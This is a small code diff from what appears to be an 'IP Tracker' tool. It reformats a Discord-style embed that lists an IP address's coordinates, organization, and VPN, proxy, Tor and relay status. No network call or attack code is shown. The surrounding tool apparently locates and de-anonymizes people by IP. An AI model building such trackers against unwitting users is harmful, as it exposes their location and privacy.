@@ -32,11 +32,11 @@
                         { name: "📌 Coordinates", value: info.loc || 'N/A', inline: false },
                         { name: "🏢 Organization", value: info.org || 'N/A', inline: false },
 
-                        { name: "🔒 Privacy Details", value: "**VPN:** " + (info.privacy?.vpn ? "✅ Yes" : "❌ No") +  
-                            "\n**Proxy:** " + (info.privacy?.proxy ? "✅ Yes" : "❌ No") +  
-                            "\n**Tor:** " + (info.privacy?.tor ? "✅ Yes" : "❌ No") +  
-                            "\n**Relay:** " + (info.privacy?.relay ? "✅ Yes" : "❌ No") +  
-                            "\n**Hosting Provider:** " + (info.privacy?.service || 'N/A'), inline: false }
+                        { name: "🔒 Privacy Details", value: "**VPN:** . . . " + (info.privacy?.vpn ? "True" : "False") +  
+                            "\n**Proxy:** . . " + (info.privacy?.proxy ? "True" : "False") +  
+                            "\n**Tor:** . . . " + (info.privacy?.tor ? "True" : "False") +  
+                            "\n**Relay:** . . " + (info.privacy?.relay ? "True" : "False") +  
+                            "\n**Provider:**. " + (info.privacy?.service || 'N/A'), inline: false }
                     ],
                     footer: { text: "IP Tracker | By 3am.unknown" },
                     timestamp: new Date()
